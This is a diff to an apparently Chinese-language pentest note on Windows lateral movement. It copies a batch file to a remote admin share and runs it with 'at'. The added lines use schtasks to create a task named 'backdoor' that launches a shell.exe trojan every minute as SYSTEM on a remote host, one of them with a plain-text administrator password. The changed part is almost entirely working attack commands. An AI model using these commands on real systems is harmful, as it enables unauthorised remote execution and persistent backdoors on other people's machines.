@@ -117,9 +117,17 @@
      
      3.将bat脚本发送到目标机器copy 1.bat \\192.168.3.144\c$
      
-     4.利用at启动该bat脚本 at \\192.168.1.144 20:05 c:\adduser.bat （有的系统已经不使用at命令，可以尝试其他命令进行启动，如schtasks）
+     4.利用at启动该bat脚本 at \\192.168.1.144 20:05 c:\adduser.bat （2008及以后系统不在使用at命令，可以尝试其他命令进行启动，如schtasks）
+     
+      每一分钟启动一次shell.exe木马
+     
+     schtasks /create /s 192.168.183.130 /tn backdoor /sc minute /mo 1  /tr c:\shell.exe /ru system /f
+     
+     在没有建立ipc连接前提，可以添加账户密码方式进行启动shell.exe木马（启动成功前提：具有管理员权限）
+     
+     schtasks /create /s 192.168.183.130 /u administrator /p Liu78963 /tn backdoor /sc minute /mo 1 /tr c:\shell.exe /ru system /f
  
-     参考：https://cloud.tencent.com/developer/article/1743842
+      参考：https://cloud.tencent.com/developer/article/1743842
  
    
   
